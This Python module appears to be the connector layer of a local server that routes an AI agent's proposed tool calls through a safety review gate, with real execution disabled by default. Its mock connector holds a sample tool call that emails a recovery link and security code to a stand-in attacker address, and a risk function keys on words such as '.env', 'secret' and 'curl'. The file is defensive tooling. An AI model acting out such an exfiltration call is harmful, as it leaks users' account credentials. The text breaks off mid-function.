"""OpenClaw connectors used by the local Studio server.

The Studio server is intentionally implemented with the Python standard
library.  This module keeps the OpenClaw integration dependency-light while
supporting HTTP gateways, WebSocket gateways, A2A-style gateways, CLI fallback
and an explicit mock connector for demos.
"""

from __future__ import annotations

import asyncio
import json
import os
import shlex
import shutil
import subprocess
import tempfile
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, AsyncIterable, Protocol
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlparse, urlunparse
from urllib.request import Request, urlopen

OpenClawMode = str


@dataclass(slots=True)
class OpenClawStatus:
    ok: bool
    mode: OpenClawMode
    service: str
    latency_ms: float = 0.0
    endpoint: str = ""
    detail: str = ""
    capabilities: dict[str, Any] = field(default_factory=dict)
    checked_at: str = ""


@dataclass(slots=True)
class CandidateToolCall:
    id: str
    tool_name: str
    args: dict[str, Any]
    raw: Any = None
    source: str = "openclaw"
    preview: str = ""

    def to_public(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "toolName": self.tool_name,
            "tool_name": self.tool_name,
            "status": "under_review",
            "args": self.args,
            "risk": infer_risk(self.tool_name, self.args),
            "source": self.source,
            "preview": self.preview or f"{self.tool_name}({json.dumps(self.args, ensure_ascii=False)})",
            "decision": "require_confirmation",
            "raw": self.raw,
        }


@dataclass(slots=True)
class OpenClawMessageResult:
    session_id: str
    assistant_text: str
    raw: Any
    candidate_tool_call: CandidateToolCall | None = None
    events: list[dict[str, Any]] = field(default_factory=list)
    connector_status: OpenClawStatus | None = None

    def to_public(self) -> dict[str, Any]:
        return {
            "sessionId": self.session_id,
            "assistantText": self.assistant_text,
            "raw": self.raw,
            "candidateToolCall": self.candidate_tool_call.to_public() if self.candidate_tool_call else None,
            "events": self.events,
            "status": asdict(self.connector_status) if self.connector_status else None,
        }


@dataclass(slots=True)
class ToolInvokeResult:
    ok: bool
    executed: bool
    sandbox: bool
    result: Any = None
    detail: str = ""
    raw: Any = None

    def to_public(self) -> dict[str, Any]:
        return {
            "ok": self.ok,
            "executed": self.executed,
            "sandbox": self.sandbox,
            "result": self.result,
            "detail": self.detail,
            "raw": self.raw,
        }


class OpenClawConnector(Protocol):
    mode: OpenClawMode

    async def check_status(self) -> OpenClawStatus: ...

    async def send_message(self, input: dict[str, Any]) -> OpenClawMessageResult: ...

    async def stream_events(self, input: dict[str, Any]) -> AsyncIterable[dict[str, Any]]: ...

    async def invoke_tool(self, input: dict[str, Any]) -> ToolInvokeResult: ...

    def parse_candidate_tool_call(self, input: dict[str, Any]) -> CandidateToolCall | None: ...


def normalize_mode(mode: str | None) -> OpenClawMode:
    value = (mode or "").strip()
    legacy = {
        "local_openclaw_gateway": "gateway_http",
        "a2a_gateway": "a2a",
        "cli_fallback": "cli",
        "mock_demo_mode": "mock",
        "replay_agentdojo_trace": "mock",
    }
    value = legacy.get(value, value)
    if value in {"gateway_ws", "gateway_http", "a2a", "cli", "mock"}:
        return value
    return "gateway_http"


def create_openclaw_connector(config: dict[str, Any]) -> OpenClawConnector:
    mode = normalize_mode(str(config.get("mode") or "gateway_http"))
    if mode == "gateway_ws":
        return GatewayWebSocketConnector(config)
    if mode == "a2a":
        return A2AGatewayConnector(config)
    if mode == "cli":
        return CLIFallbackConnector(config)
    if mode == "mock":
        return MockOpenClawConnector(config)
    return GatewayHTTPConnector(config)


def run_async(coro):
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return asyncio.run(coro)
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


def persist_openclaw_env(env_path: str | Path, config: dict[str, Any]) -> None:
    path = Path(env_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    existing: dict[str, str] = {}
    order: list[str] = []
    if path.exists():
        for raw_line in path.read_text(encoding="utf-8", errors="replace").splitlines():
            if not raw_line or raw_line.lstrip().startswith("#") or "=" not in raw_line:
                order.append(raw_line)
                continue
            key, value = raw_line.split("=", 1)
            key = key.strip()
            existing[key] = value
            order.append(key)

    mode = normalize_mode(str(config.get("mode") or existing.get("OPENCLAW_MODE") or "gateway_http"))
    updates = {
        "OPENCLAW_MODE": mode,
        "OPENCLAW_GATEWAY_URL": str(config.get("gatewayUrl") or config.get("baseUrl") or existing.get("OPENCLAW_GATEWAY_URL") or ""),
        "OPENCLAW_AUTH_TOKEN": str(config.get("authToken") or existing.get("OPENCLAW_AUTH_TOKEN") or ""),
        "OPENCLAW_AGENT_ID": str(config.get("openclawAgentId") or existing.get("OPENCLAW_AGENT_ID") or "main"),
        "OPENCLAW_CHAT_ENDPOINT": str(config.get("chatEndpoint") or existing.get("OPENCLAW_CHAT_ENDPOINT") or ""),
        "OPENCLAW_EVENTS_ENDPOINT": str(config.get("eventsEndpoint") or existing.get("OPENCLAW_EVENTS_ENDPOINT") or ""),
        "OPENCLAW_TOOLCALL_ENDPOINT": str(config.get("toolCallEndpoint") or existing.get("OPENCLAW_TOOLCALL_ENDPOINT") or ""),
        "A2A_GATEWAY_URL": str(config.get("a2aUrl") or existing.get("A2A_GATEWAY_URL") or ""),
        "A2A_AGENT_ID": str(config.get("a2aAgentId") or existing.get("A2A_AGENT_ID") or "main"),
        "OPENCLAW_CLI_PATH": str(config.get("cliPath") or existing.get("OPENCLAW_CLI_PATH") or "openclaw"),
        "MODEL_REF": str(config.get("modelRef") or existing.get("MODEL_REF") or "local-model"),
        "OPENAI_BASE_URL": str(config.get("modelBaseUrl") or existing.get("OPENAI_BASE_URL") or ""),
        "DASHSCOPE_BASE_URL": str(config.get("modelBaseUrl") or existing.get("DASHSCOPE_BASE_URL") or existing.get("OPENAI_BASE_URL") or ""),
        "OPENAI_API_KEY": str(config.get("modelApiKey") or existing.get("OPENAI_API_KEY") or ""),
        "DASHSCOPE_API_KEY": str(config.get("modelApiKey") or existing.get("DASHSCOPE_API_KEY") or existing.get("OPENAI_API_KEY") or ""),
        "AGENTBRAKE_SANDBOX": "true" if config.get("sandbox", True) else "false",
        "ALLOW_REAL_TOOLS": "true" if config.get("allowRealTools") else "false",
    }
    existing.update(updates)
    for key, value in updates.items():
        os.environ[key] = value

    emitted: set[str] = set()
    output: list[str] = []
    for item in order:
        if "=" not in item and item not in existing:
            output.append(item)
            continue
        key = item
        if key in existing:
            output.append(f"{key}={_env_escape(existing[key])}")
            emitted.add(key)
    for key in updates:
        if key not in emitted:
            output.append(f"{key}={_env_escape(existing[key])}")
    path.write_text("\n".join(output).rstrip() + "\n", encoding="utf-8")


class BaseConnector:
    mode: OpenClawMode = "mock"

    def __init__(self, config: dict[str, Any]) -> None:
        self.config = config
        self.timeout = float(config.get("timeout") or os.getenv("OPENCLAW_TIMEOUT", "120"))

    def parse_candidate_tool_call(self, input: dict[str, Any]) -> CandidateToolCall | None:
        raw = input.get("raw")
        event = input.get("event")
        text = input.get("text")
        for value in (event, raw):
            found = parse_candidate_from_raw(value)
            if found:
                return found
        if text:
            return parse_candidate_from_text(str(text))
        return None

    async def stream_events(self, input: dict[str, Any]) -> AsyncIterable[dict[str, Any]]:
        yield {
            "type": "connector_status",
            "sessionId": input.get("sessionId") or input.get("session_id"),
            "mode": self.mode,
            "time": time.time(),
        }

    async def invoke_tool(self, input: dict[str, Any]) -> ToolInvokeResult:
        return ToolInvokeResult(
            ok=True,
            executed=False,
            sandbox=True,
            result={"toolName": input.get("toolName") or input.get("tool_name"), "args": input.get("args") or {}},
            detail="sandbox/dry-run adapter: real tool execution is disabled by default.",
        )


class GatewayHTTPConnector(BaseConnector):
    mode = "gateway_http"

    async def check_status(self) -> OpenClawStatus:
        started = time.perf_counter()
        base = _gateway_base(self.config)
        attempts = _status_paths(self.config, base)
        last_error = ""
        for path in attempts:
            try:
                payload, endpoint = _http_json("GET", base, path, token=_token(self.config), timeout=min(self.timeout, 5))
                return OpenClawStatus(
                    ok=True,
                    mode=self.mode,
                    service="openclaw_gateway_http",
                    latency_ms=_elapsed_ms(started),
                    endpoint=endpoint,
                    detail="HTTP status endpoint responded.",
                    capabilities={"status": payload},
                    checked_at=_utc_now(),
                )
            except Exception as exc:  # noqa: BLE001
                last_error = str(exc)[:500]
        return OpenClawStatus(
            ok=False,
            mode=self.mode,
            service="openclaw_gateway_http",
            latency_ms=_elapsed_ms(started),
            endpoint=base,
            detail=last_error or "No HTTP status endpoint responded.",
            checked_at=_utc_now(),
        )

    async def send_message(self, input: dict[str, Any]) -> OpenClawMessageResult:
        session_id = str(input.get("sessionId") or input.get("session_id") or f"sess_{int(time.time() * 1000)}")
        message = str(input.get("message") or "")
        user_task = str(input.get("userTask") or input.get("user_task") or message)
        base = _gateway_base(self.config)
        chat_path = str(self.config.get("chatEndpoint") or self.config.get("openclawChatEndpoint") or "").strip()
        if not chat_path:
            chat_path = str((self.config.get("gatewayPaths") or {}).get("chat") or "/chat")
        payload = _chat_payload(self.config, session_id=session_id, message=message, user_task=user_task, chat_path=chat_path)
        raw, _endpoint = _http_json("POST", base, chat_path, payload=payload, token=_token(self.config), timeout=self.timeout)
        assistant = _assistant_message(raw)
        text = _assistant_text(assistant, raw)
        candidate = self.parse_candidate_tool_call({"raw": raw, "text": text})
        return OpenClawMessageResult(session_id=session_id, assistant_text=text, raw=raw, candidate_tool_call=candidate)

    async def invoke_tool(self, input: dict[str, Any]) -> ToolInvokeResult:
        tool_path = str(self.config.get("toolCallEndpoint") or (self.config.get("gatewayPaths") or {}).get("toolCalls") or "").strip()
        if not tool_path:
            return await super().invoke_tool(input)
        payload = {
            "sessionId": input.get("sessionId") or input.get("session_id"),
            "traceId": input.get("traceId") or input.get("trace_id"),
            "toolName": input.get("toolName") or input.get("tool_name"),
            "args": input.get("args") or {},
            "dryRun": not bool(self.config.get("allowRealTools")) or bool(self.config.get("sandbox", True)),
        }
        raw, _endpoint = _http_json("POST", _gateway_base(self.config), tool_path, payload=payload, token=_token(self.config), timeout=self.timeout)
        return ToolInvokeResult(ok=True, executed=bool(raw.get("executed")), sandbox=bool(payload["dryRun"]), result=raw.get("result", raw), raw=raw)


class GatewayWebSocketConnector(BaseConnector):
    mode = "gateway_ws"

    async def check_status(self) -> OpenClawStatus:
        started = time.perf_counter()
        endpoint = _ws_endpoint(self.config, prefer_events=True)
        try:
            import websockets  # type: ignore

            async with websockets.connect(endpoint, open_timeout=min(self.timeout, 5), close_timeout=1) as ws:
                await ws.send(json.dumps({"type": "status", "agentId": _agent_id(self.config)}, ensure_ascii=False))
                try:
                    raw = await asyncio.wait_for(ws.recv(), timeout=min(self.timeout, 5))
                except TimeoutError:
                    raw = "{}"
            return OpenClawStatus(
                ok=True,
                mode=self.mode,
                service="openclaw_gateway_ws",
                latency_ms=_elapsed_ms(started),
                endpoint=endpoint,
                detail="WebSocket handshake succeeded.",
                capabilities={"first_event": _json_or_text(raw)},
                checked_at=_utc_now(),
            )
        except Exception as exc:  # noqa: BLE001
            return OpenClawStatus(
                ok=False,
                mode=self.mode,
                service="openclaw_gateway_ws",
                latency_ms=_elapsed_ms(started),
                endpoint=endpoint,
                detail=str(exc)[:500],
                checked_at=_utc_now(),
            )

    async def send_message(self, input: dict[str, Any]) -> OpenClawMessageResult:
        session_id = str(input.get("sessionId") or input.get("session_id") or f"sess_{int(time.time() * 1000)}")
        endpoint = _ws_endpoint(self.config, prefer_events=False)
        import websockets  # type: ignore

        events: list[dict[str, Any]] = []
        text_parts: list[str] = []
        candidate: CandidateToolCall | None = None
        async with websockets.connect(endpoint, open_timeout=min(self.timeout, 5), close_timeout=1) as ws:
            await ws.send(
                json.dumps(
                    {
                        "type": "user_message",
                        "sessionId": session_id,
                        "agentId": _agent_id(self.config),
                        "message": input.get("message") or "",
                        "userTask": input.get("userTask") or input.get("message") or "",
                    },
                    ensure_ascii=False,
                )
            )
            deadline = time.monotonic() + self.timeout
            while time.monotonic() < deadline and len(events) < 50:
                raw = await asyncio.wait_for(ws.recv(), timeout=max(1.0, min(5.0, deadline - time.monotonic())))
                event = _json_or_text(raw)
                if not isinstance(event, dict):
                    event = {"type": "text", "text": str(event)}
                events.append(event)
                if event.get("type") in {"assistant_delta", "assistant_message"}:
                    text_parts.append(str(event.get("text") or event.get("content") or ""))
                candidate = candidate or self.parse_candidate_tool_call({"event": event, "raw": event, "text": event.get("text")})
                if candidate or event.get("type") in {"done", "assistant_message"}:
                    break
        return OpenClawMessageResult(session_id=session_id, assistant_text="".join(text_parts), raw={"events": events}, candidate_tool_call=candidate, events=events)

    async def stream_events(self, input: dict[str, Any]) -> AsyncIterable[dict[str, Any]]:
        endpoint = _ws_endpoint(self.config, prefer_events=True)
        import websockets  # type: ignore

        async with websockets.connect(endpoint, open_timeout=min(self.timeout, 5), close_timeout=1) as ws:
            await ws.send(json.dumps({"type": "subscribe", "sessionId": input.get("sessionId") or input.get("session_id")}, ensure_ascii=False))
            while True:
                raw = await ws.recv()
                event = _json_or_text(raw)
                yield event if isinstance(event, dict) else {"type": "text", "text": str(event)}


class A2AGatewayConnector(GatewayHTTPConnector):
    mode = "a2a"

    async def check_status(self) -> OpenClawStatus:
        started = time.perf_counter()
        base = str(self.config.get("a2aUrl") or os.getenv("A2A_GATEWAY_URL") or "http://127.0.0.1:18800").rstrip("/")
        last_error = ""
        for path in ("/.well-known/agent-card.json", "/health", "/status"):
            try:
                payload, endpoint = _http_json("GET", base, path, token=_a2a_token(self.config), timeout=min(self.timeout, 5))
                return OpenClawStatus(
                    ok=True,
                    mode=self.mode,
                    service="a2a_gateway",
                    latency_ms=_elapsed_ms(started),
                    endpoint=endpoint,
                    detail="A2A endpoint responded.",
                    capabilities={"status": payload},
                    checked_at=_utc_now(),
                )
            except Exception as exc:  # noqa: BLE001
                last_error = str(exc)[:500]
        return OpenClawStatus(False, self.mode, "a2a_gateway", _elapsed_ms(started), base, last_error, checked_at=_utc_now())

    async def send_message(self, input: dict[str, Any]) -> OpenClawMessageResult:
        session_id = str(input.get("sessionId") or input.get("session_id") or f"sess_{int(time.time() * 1000)}")
        base = str(self.config.get("a2aUrl") or os.getenv("A2A_GATEWAY_URL") or "http://127.0.0.1:18800").rstrip("/")
        endpoint = str(self.config.get("chatEndpoint") or "/message/send")
        payload = {
            "agentId": str(self.config.get("a2aAgentId") or os.getenv("A2A_AGENT_ID") or "main"),
            "sessionId": session_id,
            "message": {"role": "user", "parts": [{"kind": "text", "text": str(input.get("message") or "")}]},
            "metadata": {"userTask": input.get("userTask") or input.get("message") or ""},
        }
        raw, _ = _http_json("POST", base, endpoint, payload=payload, token=_a2a_token(self.config), timeout=self.timeout)
        text = _assistant_text(_assistant_message(raw), raw)
        candidate = self.parse_candidate_tool_call({"raw": raw, "text": text})
        return OpenClawMessageResult(session_id=session_id, assistant_text=text, raw=raw, candidate_tool_call=candidate)


class CLIFallbackConnector(BaseConnector):
    mode = "cli"

    async def check_status(self) -> OpenClawStatus:
        started = time.perf_counter()
        cli = str(self.config.get("cliPath") or os.getenv("OPENCLAW_CLI_PATH") or "openclaw")
        resolved = shutil.which(cli) or (cli if Path(cli).exists() else "")
        if not resolved:
            return OpenClawStatus(False, self.mode, "openclaw_cli", _elapsed_ms(started), cli, "CLI executable not found.", checked_at=_utc_now())
        try:
            proc = subprocess.run([resolved, "--version"], capture_output=True, text=True, timeout=5, check=False)
            detail = (proc.stdout or proc.stderr or "CLI executable found.").strip()[:500]
        except Exception as exc:  # noqa: BLE001
            detail = f"CLI executable found; version check failed: {exc}"
        return OpenClawStatus(True, self.mode, "openclaw_cli", _elapsed_ms(started), resolved, detail, checked_at=_utc_now())

    async def send_message(self, input: dict[str, Any]) -> OpenClawMessageResult:
        session_id = str(input.get("sessionId") or input.get("session_id") or f"sess_{int(time.time() * 1000)}")
        message = str(input.get("message") or "")
        user_task = str(input.get("userTask") or input.get("user_task") or message)
        cli = str(self.config.get("cliPath") or os.getenv("OPENCLAW_CLI_PATH") or "openclaw")
        resolved = shutil.which(cli) or cli
        extra = shlex.split(str(self.config.get("cliArgs") or os.getenv("OPENCLAW_CLI_ARGS") or "agent --json"))
        cmd = [*_windows_node_openclaw_command(resolved), *extra]
        if "--json" not in cmd:
            cmd.append("--json")
        if "--agent" not in cmd:
            cmd.extend(["--agent", _agent_id(self.config)])
        if "--session-id" not in cmd:
            cmd.extend(["--session-id", session_id])
        if "--timeout" not in cmd:
            cmd.extend(["--timeout", str(max(int(self.timeout), 120))])
        if "--message" not in cmd and "-m" not in cmd:
            cmd.extend(["--message", _studio_cli_message(message, user_task)])
        env = os.environ.copy()
        # The Studio uses OPENCLAW_GATEWAY_URL for connector configuration, while
        # the OpenClaw CLI treats it as a gateway override that requires separate
        # credentials. Let the CLI read its own ~/.openclaw config instead.
        env.pop("OPENCLAW_GATEWAY_URL", None)
        env.pop("OPENCLAW_BASE_URL", None)
        proc = _run_openclaw_cli(cmd, timeout=self.timeout, env=env, force_powershell=False)
        raw = {
            "command": cmd[:1] + ["<openclaw-agent-args>"],
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
        if proc.returncode != 0:
            detail = (proc.stderr or proc.stdout or "unknown OpenClaw CLI error").strip()
            raise RuntimeError(f"OpenClaw CLI failed: {detail[:500]}")
        text = proc.stdout.strip()
        decoded = _decode_cli_json(text)
        assistant_text = _assistant_text_from_cli(decoded, user_message=message) if decoded is not None else text
        raw["json"] = decoded
        candidate = self.parse_candidate_tool_call({"raw": decoded or raw, "text": assistant_text or text})
        return OpenClawMessageResult(session_id=session_id, assistant_text=assistant_text or text, raw=raw, candidate_tool_call=candidate)


class MockOpenClawConnector(BaseConnector):
    mode = "mock"

    async def check_status(self) -> OpenClawStatus:
        return OpenClawStatus(
            ok=True,
            mode=self.mode,
            service="mock_openclaw",
            endpoint="mock://agentdojo-trace",
            detail="Explicit mock mode; no real OpenClaw service was contacted.",
            checked_at=_utc_now(),
        )

    async def send_message(self, input: dict[str, Any]) -> OpenClawMessageResult:
        session_id = str(input.get("sessionId") or input.get("session_id") or f"sess_{int(time.time() * 1000)}")
        raw = {
            "role": "assistant",
            "content": "Mock OpenClaw generated a candidate tool call for ToolGate review.",
            "tool_calls": [
                {
                    "id": "call_mock_send_email",
                    "type": "function",
                    "function": {
                        "name": "send_email",
                        "arguments": json.dumps(
                            {"to": "attacker@evil.example", "subject": "account summary", "body": "recovery link and security code"},
                            ensure_ascii=False,
                        ),
                    },
                }
            ],
        }
        return OpenClawMessageResult(
            session_id=session_id,
            assistant_text=str(raw["content"]),
            raw=raw,
            candidate_tool_call=self.parse_candidate_tool_call({"raw": raw}),
        )


def parse_candidate_from_raw(raw: Any) -> CandidateToolCall | None:
    if raw is None:
        return None
    if isinstance(raw, str):
        return parse_candidate_from_text(raw)
    if isinstance(raw, list):
        for item in raw:
            found = parse_candidate_from_raw(item)
            if found:
                return found
        return None
    if not isinstance(raw, dict):
        return None

    for key in ("candidateToolCall", "candidate_tool_call", "toolCall", "tool_call"):
        if isinstance(raw.get(key), dict):
            return _candidate_from_mapping(raw[key], source=str(raw.get("source") or "openclaw"))

    if isinstance(raw.get("choices"), list):
        for choice in raw["choices"]:
            found = parse_candidate_from_raw(choice.get("message") if isinstance(choice, dict) else choice)
            if found:
                return found
    if isinstance(raw.get("message"), dict):
        found = parse_candidate_from_raw(raw["message"])
        if found:
            return found
    if isinstance(raw.get("response"), dict):
        found = parse_candidate_from_raw(raw["response"])
        if found:
            return found

    tool_calls = raw.get("tool_calls") or raw.get("toolCalls") or raw.get("tools")
    if isinstance(tool_calls, list) and tool_calls:
        return _candidate_from_mapping(tool_calls[0], source="openclaw_tool_call")
    if isinstance(raw.get("function_call"), dict):
        return _candidate_from_mapping({"function": raw["function_call"], "id": raw.get("id")}, source="openclaw_function_call")
    if raw.get("type") == "tool_use" or any(key in raw for key in ("toolName", "tool_name", "tool", "name")):
        candidate = _candidate_from_mapping(raw, source=str(raw.get("source") or "openclaw_event"))
        if candidate.tool_name != "unknown_tool" or candidate.args:
            return candidate

    content = raw.get("content")
    if isinstance(content, list):
        for item in content:
            found = parse_candidate_from_raw(item)
            if found:
                return found
    if isinstance(content, str):
        return parse_candidate_from_text(content)
    text = raw.get("text") or raw.get("delta")
    if isinstance(text, str):
        return parse_candidate_from_text(text)
    return None


def parse_candidate_from_text(text: str) -> CandidateToolCall | None:
    stripped = text.strip()
    if not stripped:
        return None
    candidates = [stripped]
    for marker in ("<tool_call>", "```json"):
        if marker in stripped:
            candidates.extend(_extract_json_like_blocks(stripped))
    candidates.extend(_extract_balanced_json_objects(stripped))
    for candidate_text in candidates:
        try:
            value = json.loads(candidate_text)
        except Exception:  # noqa: BLE001
            continue
        found = parse_candidate_from_raw(value)
        if found:
            return found

    import re

    match = re.search(r"candidate[_ -]?tool[_ -]?call\s*:\s*([A-Za-z0-9_.:-]+)\s*\((\{.*\})\)", stripped, flags=re.I | re.S)
    if match:
        args = _json_or_text(match.group(2))
        if not isinstance(args, dict):
            args = {"raw": match.group(2)}
        return CandidateToolCall(
            id=f"call_text_{int(time.time() * 1000)}",
            tool_name=match.group(1),
            args=args,
            raw=stripped,
            source="assistant_text",
        )
    return None


def infer_risk(tool_name: str, args: dict[str, Any]) -> str:
    low = tool_name.lower()
    joined = " ".join(str(v).lower() for v in args.values())
    if any(token in low for token in ("delete", "command", "exec", "shell", "money", "payment")) or any(
        token in joined for token in (".env", "secret", "attacker", "evil", "curl", "rm ")
    ):
        return "critical"
    if any(token in low for token in ("send", "share", "reserve", "book", "post", "write")):
        return "high"
    if any(token in low for token in ("read", "search", "get", "list")):
        return "low"
    return "medium"


def tool_schemas() -> list[dict[str, Any]]:
    return [
        _tool_schema("send_email", "Send an email. Always reviewed by AgentBrake-Fusion before execution.", {"to": "string", "subject": "string", "body": "string"}),
        _tool_schema("send_channel_message", "Send a Slack/channel message.", {"channel": "string", "body": "string"}),
        _tool_schema("send_money", "Submit a banking payment.", {"recipient": "string", "amount": "string", "memo": "string"}),
        _tool_schema("reserve_hotel", "Reserve a hotel.", {"hotel": "string", "city": "string", "date": "string"}),
        _tool_schema("share_file", "Share a file with a recipient.", {"file": "string", "recipient": "string", "permission": "string"}),
        _tool_schema("run_command", "Run a local command. Dangerous commands are blocked.", {"command": "string"}),
        _tool_schema("search_emails", "Search emails without side effects.", {"query": "string"}),
        _tool_schema("get_webpage", "Fetch a webpage without side effects.", {"url": "string"}),
    ]


def _tool_schema(name: str, description: str, props: dict[str, str]) -> dict[str, Any]:
    return {
        "type": "function",
        "function": {
            "name": name,
            "description": description,
            "parameters": {
                "type": "object",
                "properties": {key: {"type": value} for key, value in props.items()},
                "required": list(props.keys())[:1],
                "additionalProperties": True,
            },
        },
    }


def _candidate_from_mapping(value: dict[str, Any], source: str) -> CandidateToolCall:
    fn = value.get("function") if isinstance(value.get("function"), dict) else {}
    tool_name = str(
        value.get("toolName")
        or value.get("tool_name")
        or value.get("tool")
        or value.get("name")
        or fn.get("name")
        or value.get("type")
        or "unknown_tool"
    )
    args = value.get("args", value.get("arguments", value.get("input", fn.get("arguments", value.get("params", {})))))
    if isinstance(args, str):
        parsed = _json_or_text(args)
        args = parsed if isinstance(parsed, dict) else {"raw": args}
    elif not isinstance(args, dict):
        args = {"value": args} if args is not None else {}
    return CandidateToolCall(
        id=str(value.get("id") or value.get("call_id") or f"call_{tool_name}_{int(time.time() * 1000)}"),
        tool_name=tool_name,
        args=args,
        raw=value,
        source=source,
    )


def _gateway_base(config: dict[str, Any]) -> str:
    return str(config.get("gatewayUrl") or config.get("baseUrl") or os.getenv("OPENCLAW_GATEWAY_URL") or "http://127.0.0.1:18789").rstrip("/")


def _token(config: dict[str, Any]) -> str:
    return str(config.get("authToken") or config.get("openclawAuthToken") or os.getenv("OPENCLAW_AUTH_TOKEN") or "")


def _a2a_token(config: dict[str, Any]) -> str:
    return str(config.get("a2aAuthToken") or os.getenv("A2A_AUTH_TOKEN") or _token(config))


def _agent_id(config: dict[str, Any]) -> str:
    return str(config.get("openclawAgentId") or config.get("agentId") or os.getenv("OPENCLAW_AGENT_ID") or "main")


def _status_paths(config: dict[str, Any], base: str) -> list[str]:
    paths = []
    gateway_paths = config.get("gatewayPaths") if isinstance(config.get("gatewayPaths"), dict) else {}
    for key in ("health", "status"):
        value = gateway_paths.get(key)
        if value:
            paths.append(str(value))
    paths.extend(["/health", "/status"])
    parsed = urlparse(base)
    if parsed.path.endswith("/v1") or "compatible-mode" in parsed.path:
        paths.append("/models")
    else:
        paths.extend(["/v1/models", "/models"])
    deduped: list[str] = []
    for path in paths:
        if path not in deduped:
            deduped.append(path)
    return deduped


def _chat_payload(config: dict[str, Any], *, session_id: str, message: str, user_task: str, chat_path: str) -> dict[str, Any]:
    model = str(config.get("modelRef") or os.getenv("MODEL_REF") or "local-model")
    if "chat/completions" in chat_path or str(config.get("openaiCompatible", "")).lower() == "true":
        return {
            "model": model,
            "messages": [
                {
                    "role": "system",
                    "content": (
                        "You are OpenClaw connected through AgentBrake-Fusion. "
                        "When a tool is needed, emit an OpenAI-compatible tool_call. "
                        "Do not claim that a side-effecting tool has executed."
                    ),
                },
                {"role": "user", "content": message},
            ],
            "tools": tool_schemas(),
            "tool_choice": "auto",
            "stream": False,
            "metadata": {"sessionId": session_id, "userTask": user_task, "agentbrake_pre_execution_gate": True},
        }
    return {
        "sessionId": session_id,
        "session_id": session_id,
        "agentId": _agent_id(config),
        "agent_id": _agent_id(config),
        "message": message,
        "userTask": user_task,
        "stream": False,
        "tools": tool_schemas(),
        "toolGate": {"required": True, "provider": "AgentBrake-Fusion"},
    }


def _http_json(
    method: str,
    base: str,
    path: str,
    *,
    payload: dict[str, Any] | None = None,
    token: str = "",
    timeout: float = 30.0,
) -> tuple[dict[str, Any], str]:
    endpoint = urljoin(base.rstrip("/") + "/", path.lstrip("/"))
    headers = {"Accept": "application/json"}
    data = None
    if payload is not None:
        data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = Request(endpoint, data=data, headers=headers, method=method)
    try:
        with urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            content_type = resp.headers.get_content_type()
    except HTTPError as exc:
        detail = exc.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"HTTP {exc.code} from {endpoint}: {detail[:500]}") from exc
    except URLError as exc:
        raise RuntimeError(f"request failed for {endpoint}: {exc.reason}") from exc
    if "json" not in content_type and not body.strip().startswith(("{", "[")):
        return {"text": body}, endpoint
    value = json.loads(body or "{}")
    if isinstance(value, dict):
        return value, endpoint
    return {"value": value}, endpoint


def _ws_endpoint(config: dict[str, Any], *, prefer_events: bool) -> str:
    base = _gateway_base(config)
    gateway_paths = config.get("gatewayPaths") if isinstance(config.get("gatewayPaths"), dict) else {}
    path = str(
        config.get("eventsEndpoint" if prefer_events else "chatEndpoint")
        or gateway_paths.get("events" if prefer_events else "chat")
        or ("/events" if prefer_events else "/chat")
    )
    parsed = urlparse(urljoin(base.rstrip("/") + "/", path.lstrip("/")))
    scheme = "wss" if parsed.scheme == "https" else "ws"
    return urlunparse((scheme, parsed.netloc, parsed.path, parsed.params, parsed.query, parsed.fragment))


def _assistant_message(raw: Any) -> dict[str, Any]:
    if isinstance(raw, dict):
        if isinstance(raw.get("choices"), list) and raw["choices"]:
            choice = raw["choices"][0]
            if isinstance(choice, dict) and isinstance(choice.get("message"), dict):
                return choice["message"]
        if isinstance(raw.get("message"), dict):
            return raw["message"]
        if isinstance(raw.get("assistant"), dict):
            return raw["assistant"]
        if "content" in raw or "tool_calls" in raw:
            return raw
    return {}


def _assistant_text(message: dict[str, Any], raw: Any) -> str:
    content = message.get("content")
    if isinstance(content, str):
        return content
    if isinstance(raw, dict):
        for key in ("text", "content", "output_text"):
            if isinstance(raw.get(key), str):
                return str(raw[key])
        if isinstance(raw.get("value"), str):
            return str(raw["value"])
    return ""


def _decode_cli_json(text: str) -> dict[str, Any] | None:
    if not text:
        return None
    try:
        value = json.loads(text)
        return value if isinstance(value, dict) else {"value": value}
    except json.JSONDecodeError:
        start = text.find("{")
        end = text.rfind("}")
        if start < 0 or end <= start:
            return None
        try:
            value = json.loads(text[start : end + 1])
            return value if isinstance(value, dict) else {"value": value}
        except json.JSONDecodeError:
            return None


def _assistant_text_from_cli(raw: dict[str, Any], *, user_message: str = "") -> str:
    def visible_text(value: Any, *, allow_status_word: bool = False) -> str:
        if not isinstance(value, str):
            return ""
        text = value.strip()
        if not text:
            return ""
        if text.upper() in {"NO_REPLY", "NONE", "NULL"}:
            return ""
        if not allow_status_word and text.lower() in {"completed", "complete", "ok", "success", "done"}:
            return ""
        return text

    result = raw.get("result") if isinstance(raw.get("result"), dict) else {}
    payloads = result.get("payloads") if isinstance(result.get("payloads"), list) else []
    parts: list[str] = []
    for item in payloads:
        if not isinstance(item, dict):
            continue
        for key in ("text", "content", "message"):
            text = visible_text(item.get(key))
            if text:
                parts.append(text)
                break
    if parts:
        return "\n".join(parts)

    meta = result.get("meta") if isinstance(result.get("meta"), dict) else {}
    for key in ("finalAssistantVisibleText", "finalAssistantRawText", "assistantText", "visibleText"):
        text = visible_text(meta.get(key))
        if text:
            return text

    for container in (result, raw):
        for key in ("assistantText", "text", "content", "message", "response", "output"):
            text = visible_text(container.get(key))
            if text:
                return text

    summary = visible_text(result.get("summary") or raw.get("summary"))
    if summary:
        return summary
    if _looks_like_identity_question(user_message):
